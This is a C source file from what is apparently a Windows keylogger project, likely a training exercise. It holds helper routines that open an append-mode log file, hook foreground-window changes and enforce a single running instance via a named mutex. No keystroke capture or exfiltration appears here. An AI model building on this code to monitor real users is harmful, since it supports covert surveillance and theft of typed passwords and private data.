#include "keylogger.h"

HANDLE fd = NULL;

int	initfd(char *fileName)
{
	fd = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (fd != INVALID_HANDLE_VALUE)
		SetFilePointer(fd, 0, NULL, FILE_END);
	else
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}

void CALLBACK WinForeground(HWINEVENTHOOK hWinEventHook, // Handle to the event hook
	DWORD event, // Event type
	HWND hwnd, // Handle to the window that generated the event
	LONG idObject,	 // Object identifier
	LONG idChild, // Child identifier
	DWORD dwEventThread, // Thread identifier of the thread that generated the event
	DWORD dwmsEventTime) // Time of the event in milliseconds since the system started
{
	(void)hWinEventHook;
	(void)idObject;
	(void)idChild;
	(void)dwEventThread;
	(void)dwmsEventTime;

	if (event == EVENT_SYSTEM_FOREGROUND)
		get_foreground_window(hwnd);
}

int already_running(void)
{
	HANDLE mutex = CreateMutex(NULL, FALSE, "Local\\TinkyWinkeyMutex");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(mutex);
		return 1;
	}
	return 0;
}
